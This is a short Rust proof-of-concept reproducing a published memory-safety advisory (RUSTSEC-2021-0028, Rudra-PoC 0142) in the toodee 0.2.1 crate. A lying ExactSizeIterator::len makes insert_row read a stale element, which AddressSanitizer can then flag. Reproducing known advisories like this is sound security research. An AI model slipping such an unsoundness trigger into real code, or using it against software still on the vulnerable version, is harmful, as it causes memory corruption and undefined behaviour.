//! Published Rudra-PoC 0142 for RUSTSEC-2021-0028 (`toodee` 0.2.1).
//!
//! The witness preserves the published wrong-`ExactSizeIterator::len` root
//! cause and uses the PoC's `Box<u8>` payload, making the stale element read
//! visible to AddressSanitizer.

#![forbid(unsafe_code)]

use toodee::TooDee;

struct IteratorWithWrongLength;

impl Iterator for IteratorWithWrongLength {
    type Item = Box<u8>;

    fn next(&mut self) -> Option<Self::Item> {
        None
    }
}

impl ExactSizeIterator for IteratorWithWrongLength {
    fn len(&self) -> usize {
        1
    }
}

fn main() {
    let values = vec![Box::<u8>::new(1)];
    let mut matrix: TooDee<_> = TooDee::from_vec(1, 1, values);
    matrix.insert_row(1, IteratorWithWrongLength);
    std::hint::black_box(*matrix[1][0]);
}
